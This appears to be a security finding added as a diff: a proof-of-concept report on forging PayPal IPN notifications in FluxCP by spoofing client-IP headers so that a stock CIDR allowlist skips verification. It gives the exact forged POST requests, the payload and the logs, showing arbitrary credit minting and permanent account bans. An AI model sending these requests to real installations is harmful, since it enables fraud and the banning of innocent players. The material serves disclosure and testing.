@@ -1,0 +1,87 @@
+FLUXCP-D2N1 — Unauthenticated PayPal IPN forgery: spoofable client-IP headers +
+verification-free CIDR allowlist path => arbitrary donation crediting / bans
+==============================================================================
+Target      : FluxCP (rAthena control panel), master@98cd4b8
+Code path   : modules/donate/notify.php L4-8 (unauthenticated POST -> process()),
+              lib/Flux/PaymentNotifyRequest.php:
+                fetchIP()          L117-136  prefers HTTP_X_REAL_IP over REMOTE_ADDR
+                process() gate     L134      (in_array($received_from,$allowed) && verify()) || verifyiprange($received_from)
+                verifyiprange()    L336-362  pure CIDR/exact-IP math, NEVER calls verify()
+                unserialize(custom)L158      attacker-controlled serialized payload
+                depositCredits()   L211-217  credits = floor(mc_gross / CreditExchangeRate), no txnIsValid gate
+                permanentlyBan()   L278      on payment_status in BanPaymentStatuses
+              config/application.php L109-124: stock PayPalAllowedHosts contains
+              '173.0.81.1' AND '173.0.81.0/24' (plus 173.0.80.0/20 etc.);
+              L103 PayPalBusinessEmail='admin@localhost' (default);
+              L142-145 BanPaymentStatuses = {Cancelled_Reversal, Reversed}.
+
+Environment : local harness on 127.0.0.1:8090 (Windows, PHP 8.4.26). Full FluxCP
+              install requires a live rAthena server; per degrade strategy the
+              UNMODIFIED lib/Flux/PaymentNotifyRequest.php (+ real LogFile/Config/
+              Error) was driven through a minimal harness that stubs ONLY the
+              rAthena server-group DB layer (depositCredits/permanentlyBan/
+              hasCreditsRecord/txn-log -> recorded calls). All other config values
+              are copied verbatim from stock config/application.php. Dispatch
+              replicates modules/donate/notify.php verbatim:
+                if (count($_POST)) { (new Flux_PaymentNotifyRequest($_POST))->process(); }
+              Harness files: ../harness/{index.php,stubs.php}.
+custom payload (both runs): base64(serialize(['account_id'=>2000000,'server_name'=>'alice']))
+              = YToyOntzOjEwOiJhY2NvdW50X2lkIjtpOjIwMDAwMDA7czoxMToic2VydmVyX25hbWUiO3M6NToiYWxpY2UiO30=
+
+[1] CONTROL — no spoofed header (REMOTE_ADDR = 127.0.0.1):
+    POST /?module=donate&action=notify  receiver_email=admin@localhost
+         payment_status=Completed&txn_type=web_accept&txn_id=CONTROL-1
+         mc_gross=99999&mc_currency=USD&custom=<payload>
+    -> paypal.log:
+       "Received notification from 127.0.0.1 (<REDACTED>)"
+       "Transaction invalid, aborting."
+    -> gate correctly rejects; no verify() contact, no deposit, no ban.
+       (gethostbyaddr('127.0.0.1') = machine hostname, not in allowlist.)
+
+[2] ATTACK A — credit minting with spoofed X-Real-IP:
+    POST /?module=donate&action=notify  -H 'X-Real-IP: 173.0.81.77'
+         receiver_email=admin@localhost&payment_status=Completed&txn_type=web_accept
+         &txn_id=FAKE-CREDITS-1&mc_gross=99999&mc_currency=USD
+         &payer_email=attacker@evil.example&custom=<payload>
+    -> paypal.log (abridged):
+       "Received notification from 173.0.81.77 (173.0.81.77)"   <- header honored; PTR-less IP stays dotted
+       "Proceeding to validate the authenticity of the transaction..."  <- GATE PASSED
+       "Transaction identified as FAKE-CREDITS-1."
+       "Received 99999 (USD)."
+       "Game server name: alice, account ID: 2000000"
+       "Payment for txn_id#FAKE-CREDITS-1 has been completed."
+       "Updating account credit balance from 0 to 99999"
+       "Deposited credits."
+    -> stub-calls.log:
+       "STUB depositCredits(accountID=2000000, credits=99999.0, donationAmount=99999.0)"
+    CRITICAL: there is NO "Establishing connection to PayPal server ..." log line
+    (verify() logs that before contacting PayPal; verify() was NEVER invoked).
+    The gate passed exclusively via verifyiprange(): 173.0.81.77 & /24 mask ==
+    173.0.81.0 in the STOCK allowlist. Zero PayPal interaction, txnIsValid stays
+    false, yet arbitrary account 2000000 is credited 99999 (floor(99999/1.0)).
+
+[3] ATTACK B — permanent ban of any account, same primitive:
+    POST /?module=donate&action=notify  -H 'X-Real-IP: 173.0.81.77'
+         receiver_email=admin@localhost&payment_status=Reversed&txn_type=web_accept
+         &txn_id=FAKE-BAN-1&mc_gross=10&mc_currency=USD&custom=<payload with account_id=2000001>
+    -> paypal.log:
+       "Incomplete payment status: Reversed (exchanging for credits will not take place)"
+       "Auto-ban payment status detected: Reversed"
+       "Banning account! (serv: alice, account_id: 2000001)"
+    -> stub-calls.log:
+       "STUB permanentlyBan(accountID=2000001, reason='Banned for invalid payment status: Reversed')"
+
+[4] Secondary spoofable header also honored (fetchIP order):
+    X-Forwarded-For: 173.0.81.99 -> gate passes via stock /24, depositCredits fires
+    ("STUB depositCredits(accountID=2000000, credits=500.0, donationAmount=500.0)").
+
+[5] TRUE NEGATIVE — non-PayPal spoofed IP is still rejected:
+    X-Real-IP: 8.8.8.8 -> "Received notification from 8.8.8.8 (dns.google)"
+    -> "Transaction invalid, aborting." (proves the harness gate is not a no-op).
+
+Impact summary: on any deployment without a trusted proxy stripping inbound
+X-Real-IP/X-Forwarded-For (FluxCP itself always trusts them), an unauthenticated
+attacker (a) forges Completed IPNs to mint arbitrary credits into any account,
+(b) forges Reversed IPNs to permanently ban any account. Stock config already
+ships the CIDR entry that enables (a)/(b); receiver_email defaults to
+'admin@localhost' and is routinely public on real installs.
